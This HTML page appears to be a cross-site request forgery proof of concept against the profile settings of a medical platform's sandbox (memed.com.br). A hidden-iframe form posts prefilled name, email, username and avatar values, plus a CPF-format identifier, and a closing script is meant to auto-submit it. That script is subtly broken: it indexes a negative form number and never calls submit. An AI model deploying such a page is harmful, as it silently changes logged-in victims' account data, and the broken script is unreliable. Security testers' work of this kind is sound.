<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <iframe name="ok" frameborder="0"></iframe>
    <form target="ok" id="profile" name="profile" action="https://sandbox.memed.com.br/plataforma/" method="POST" class="app-form" novalidate="novalidate">
        <header>
          <h2>Configurações</h2>
        </header>
        <div class="tabs">
          <ul class="estudante">
            
            <li data-tab="tabDadosPessoais" class="width-col-3 active">Dados Pessoais</li>
            
            
            <li data-tab="tabSenha" class="width-col-3">Alterar Senha</li>
            

            
          </ul>
          <div class="tab-content">
            
            <div id="tabDadosPessoais" class="active">
              <ul>
                <li class="full sexo">
                  <label>Sexo</label>
                  <br>
                  <span class="radio">
                    <input type="radio" id="masculino" name="sexo" value="M" checked="">
                    <label for="masculino">Dr.</label>
                  </span>
                  <span class="radio">
                    <input type="radio" id="feminino" name="sexo" value="F">
                    <label for="feminino">Dra.</label>
                  </span>
                </li>
                <li>
                  <i class="md-icon user"></i>
                  <input type="text" id="nome" name="nome" value="Rodrigo" placeholder="Nome" aria-required="true" aria-invalid="false" class="valid">
                </li>
                <li>
                  <i class="md-icon user"></i>
                  <input type="text" id="sobrenome" name="sobrenome" value="Campos" placeholder="Sobrenome">
                </li>
                <li>
                  <i class="md-icon calendar"></i>
                  <input type="text" id="data_nascimento" name="data_nascimento" class="data" value="20/02/1998" placeholder="Data de nascimento">
                </li>
                <li>
                  <i class="md-icon user"></i>
                  <input type="text" id="cpf" name="cpf" value="312.305.170-65" placeholder="CPF" disabled="">
                </li>
                <li style="height: 43px">
                  <i class="md-icon map"></i>
                  <input type="text" id="cidade" name="cidade" value="" class="cidade selectized" placeholder="Cidade onde atende" tabindex="-1" style="display: none;"><div class="selectize-control cidade single"><div class="selectize-input items not-full"><input type="text" autocomplete="off" tabindex="" placeholder="Cidade onde atende" style="width: 148px;"></div><div class="selectize-dropdown single cidade" style="display: none;"><div class="selectize-dropdown-content"></div></div></div>
                </li>
                <li>
                  <i class="md-icon email"></i>
                  <input type="email" id="email" name="email" value="rrdd@yopmail.com" placeholder="e-mail">
                </li>
              </ul>
            </div>
            <div id="tabDadosProfissionais">
              <ul>
                <li>
                  <label for="especialidade">Especialidade</label>
                  <div>
                    <i class="md-icon academic-cap"></i>
                    
                    <input type="text" id="especialidade" name="especialidade" value="Clínica médica" disabled="">
                    
                  </div>
                </li>
                <li>
                  <label for="sociedade">Sociedades</label>
                  <div>
                    <i class="md-icon shield"></i>
                    <input type="text" id="sociedade" name="sociedade" readonly="readonly" value="">
                  </div>
                </li>
                <li>
                  <div>
                    <i class="md-icon user"></i>
                    <input type="text" id="crm" name="crm" value="0" disabled="">
                  </div>
                </li>
              </ul>
            </div>
            
            <div id="tabSenha" class="">
              <ul>
                
                <li class="full">
                  <i class="md-icon padlock-locked"></i>
                  <input type="password" id="senha_atual" name="senha_atual" value="" placeholder="Senha Atual" aria-invalid="false" class="valid">
                </li>
                
                <li class="full">
                  <i class="md-icon padlock-locked"></i>
                  <input type="password" id="nova_senha" name="nova_senha" value="" placeholder="Nova Senha" aria-invalid="true" class="error"><label id="nova_senha-error" class="error" for="nova_senha">Sua senha deve conter no minimo 8 caracteres.</label>
                </li>
                <li class="full">
                  <i class="md-icon padlock-locked"></i>
                  <input type="password" id="confirmar_senha" name="confirmar_senha" value="" placeholder="Confirmar Senha" aria-invalid="true" class="error"><label id="confirmar_senha-error" class="error" for="confirmar_senha">As senhas não conferem</label>
                </li>
              </ul>
            </div>
            <div id="tabPerfilPublico">
              <ul>
                <li class="full">
                  <i class="md-icon user"></i>
                  <input type="text" id="user_name" name="user_name" value="roddd" class="user-input-icon" placeholder="Nome de Usuário">
                </li>
                <li>
                  <i class="md-icon user"></i>
                  <input type="text" id="avatar" name="avatar" class="user-input-icon" value="orrrrr" placeholder="Url Imagem Perfil">
                </li>
                <li>
                  <i class="md-icon user"></i>
                  <input type="text" id="imagem_capa" name="imagem_capa" class="user-input-icon" value="rfeoeve" placeholder="Url Imagem Capa">
                </li>
              </ul>
              <textarea id="biografia" class="form-control" name="biografia" placeholder="Biografia" rows="4"></textarea>
            </div>
          </div>
        </div>
      </form>
    
</body>
<script>document.forms[0-15].submit</script>
</html>
